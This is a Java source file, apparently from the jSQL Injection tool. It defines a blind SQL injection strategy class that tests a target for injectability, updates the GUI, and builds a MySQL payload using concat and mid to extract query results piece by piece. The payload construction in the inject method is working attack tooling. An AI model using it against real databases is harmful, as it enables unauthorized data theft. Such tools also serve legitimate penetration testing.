package com.jsql.model.pattern.strategy;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.AbstractSuspendable;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.ConcreteBlindInjection;
import com.jsql.view.MediatorGUI;

/**
 * Injection strategy using blind attack.
 */
public class StrategyBlind extends AbstractStrategyInjection {
    /**
     * Blind injection object.
     */
    private ConcreteBlindInjection blind;
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(StrategyBlind.class);

    @Override
    public void checkApplicability() throws PreparationException {
        LOGGER.info("Blind test...");
        
        this.blind = new ConcreteBlindInjection();
        
        this.isApplicable = this.blind.isInjectable();
        
        if (this.isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }

    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkBlindVulnerable");
        MediatorGUI.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkBlindInvulnerable");
        MediatorGUI.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable) throws StoppableException {
        return blind.inject("(" +
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")" +
                ")", stoppable);
    }

    @Override
    public void applyStrategy() {
        LOGGER.info("Using blind injection...");
        MediatorGUI.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MessageBinary");
        request.setParameters(blind.getInfoMessage());
        MediatorGUI.model().interact(request);
        
        Request request2 = new Request();
        request2.setMessage("MarkBlindStrategy");
        MediatorGUI.model().interact(request2);
    }
}
